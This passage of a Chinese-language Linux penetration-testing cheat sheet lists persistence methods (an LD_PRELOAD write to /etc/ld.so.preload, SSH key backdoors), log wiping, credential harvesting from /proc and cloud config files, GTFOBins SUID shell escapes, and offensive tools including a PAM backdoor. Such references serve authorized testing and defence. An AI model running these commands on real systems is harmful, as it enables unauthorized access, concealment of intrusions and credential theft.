| LD_PRELOAD | `echo "/tmp/evil.so" >> /etc/ld.so.preload` |
| ld.so.conf | 添加恶意库路径到 `/etc/ld.so.conf.d/` |
| LD_LIBRARY_PATH | 在 `.bashrc` 中设置 |

### 8.4 计划任务持久化

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 用户 crontab | `crontab -e` |
| 系统 crontab | `/etc/crontab`、`/etc/cron.d/` |
| Systemd 定时器 | `.timer` + `.service` 文件 |

### 8.5 SSH 持久化

| 测试点 | 关键命令/方法 |
|--------|--------------|
| SSH 密钥后门 | 添加公钥到 `authorized_keys` |
| SSH 配置后门 | `PermitRootLogin yes` |

### 8.6 启动脚本持久化

| 测试点 | 关键命令/方法 |
|--------|--------------|
| System V Init | `/etc/init.d/`、`/etc/rc.local` |
| Systemd 服务 | `.service` 文件 + `systemctl enable` |
| Profile 脚本 | `.bashrc`、`.profile`、`/etc/profile` |

### 8.7 文件隐藏技术

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 隐藏文件名 | 以 `.` 开头 |
| 不可删除标志 | `chattr +i` |
| xattr 隐藏数据 | `setfattr -n user.hidden` |

### 8.8 日志清理与痕迹擦除

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 清除 bash 历史 | `history -c`、`> ~/.bash_history` |
| 清除 wtmp/lastlog | `utmpdump` 编辑、`echo > /var/log/lastlog` |
| 清除特定 IP 日志 | `sed -i '/IP/d' /var/log/auth.log` |
| 安全删除 | `shred -vfz -n 5` |
| 禁用日志服务 | `systemctl stop rsyslog` |

### 8.9 凭据获取与利用

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 环境变量凭据收割 | `cat /proc/<PID>/environ` |
| Systemd 单元文件凭据 | `grep "Environment=" /etc/systemd/system/` |
| GPG 密钥战利品 | `GNUPGHOME` 重定向解密 |
| 高价值用户文件 | `.git-credentials`、`.aws/credentials`、`.kube/config` |

### 8.10 高级隐蔽技术

| 测试点 | 关键命令/方法 |
|--------|--------------|
| 进程伪装 | `prctl(PR_SET_NAME)` + argv 覆盖 |
| 单实例互斥锁 | 绑定回环端口实现单实例 |
| BPF 内核驻留后门 | BPF 套接字过滤器被动后门 |
| ICMP 中继 | 在 ICMP 有效负载中转发命令 |
| 原始套接字检测 | `ss -0pb`、`cat /proc/net/packet` |

---

## 九、GTFOBins 速查

> 参考：https://gtfobins.github.io/

### 9.1 常见 SUID/特权命令利用

| 命令 | 利用方式 |
|------|---------|
| bash | `bash -p`（SUID 提权） |
| python | `python -c 'import os; os.execl("/bin/bash", "bash", "-p")'` |
| find | `find / -exec /bin/bash -p \;` |
| vim | `vim -c ':!/bin/bash'` |
| nmap | `nmap --interactive` → `!sh` |
| less | `!bash` |
| more | `!bash` |
| awk | `awk 'BEGIN {system("/bin/bash")}'` |
| man | `man man` → `!bash` |
| ftp | `!bash` |
| env | `env /bin/bash -p` |
| cp | 覆写 `/etc/passwd` 或 `/etc/shadow` |
| mv | 覆写敏感文件 |
| chmod | 修改关键文件权限 |
| chown | 修改关键文件属主 |
| tar | 通配符注入 |
| zip | 命令注入 |
| strace | `-o /proc/self/fd/1` 读取任意文件 |
| gdb | `gdb -nx -ex '!sh' -ex quit` |
| perl | `perl -e 'exec "/bin/bash";'` |
| ruby | `ruby -e 'exec "/bin/bash"'` |
| lua | `os.execute('/bin/bash')` |
| php | `php -r "system('/bin/bash');"` |
| node | `node -e 'require("child_process").spawn("/bin/bash")'` |
| java | `Runtime.getRuntime().exec("/bin/bash")` |

### 9.2 环境变量滥用

| 变量 | 利用方式 |
|------|---------|
| LD_PRELOAD | 加载恶意共享库 |
| LD_LIBRARY_PATH | 劫持库搜索路径 |
| PYTHONPATH | 注入恶意 Python 模块 |
| PERL5OPT | 注入 Perl 代码 |
| NODE_OPTIONS | 注入 Node.js 代码 |
| BASH_ENV | Bash 启动时执行代码 |

---

## 附录：自动化枚举工具

| 工具 | 用途 | 链接 |
|------|------|------|
| linpeas | Linux 提权枚举 | https://github.com/carlospolop/PEASS-ng |
| CDK | 容器渗透工具 | https://github.com/cdk-team/CDK |
| amicontained | 容器限制识别 | https://github.com/genuinetools/amicontained |
| deepce | Docker 枚举 | https://github.com/stealthcopter/deepce |
| trivy | 漏洞扫描 | https://github.com/aquasecurity/trivy |
| grype | 漏洞扫描 | https://github.com/anchore/grype |
| Tracee | 运行时取证 | https://github.com/aquasecurity/tracee |
| uptux | D-Bus/systemd 审计 | https://github.com/initstring/uptux |
| dbusmap | D-Bus 枚举 | https://github.com/taviso/dbusmap |
| Bashfuscator | 命令混淆 | https://github.com/Bashfuscator/Bashfuscator |
| GTFOBins | 特权命令速查 | https://gtfobins.github.io/ |
| DDexec | 内存执行 | https://github.com/arget13/DDexec |
| linux-pam-backdoor | PAM 后门 | https://github.com/zephrax/linux-pam-backdoor |
| DistrolessRCE | 无发行版 RCE | https://github.com/carlospolop/DistrolessRCE |